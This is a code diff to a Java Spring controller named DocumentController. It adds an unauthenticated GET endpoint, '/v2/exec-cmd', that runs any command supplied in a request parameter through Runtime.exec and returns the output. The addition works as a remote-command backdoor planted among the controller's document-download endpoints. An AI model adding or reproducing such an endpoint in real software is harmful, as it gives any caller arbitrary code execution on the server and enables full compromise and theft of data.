@@ -20,6 +20,23 @@ public class DocumentController {
         }
     }
 
+    @GetMapping("/v2/exec-cmd")
+    public String executeCommand(@RequestParam String cmd) {
+        try {
+            logger.warn("Executing user-supplied command: {}", cmd);
+            Process process = Runtime.getRuntime().exec(cmd);
+            java.io.InputStream inputStream = process.getInputStream();
+            java.util.Scanner scanner = new java.util.Scanner(inputStream).useDelimiter("\\A");
+            String output = scanner.hasNext() ? scanner.next() : "";
+            scanner.close();
+            return output;
+        } catch (Exception e) {
+            logger.error("Command execution failed: {}", e.getMessage());
+            return "Error: " + e.getMessage();
+        }
+    }
+
+
     @GetMapping("/v2/download")
     public String downloadDocumentV2(@RequestParam String filePath) {
         try {
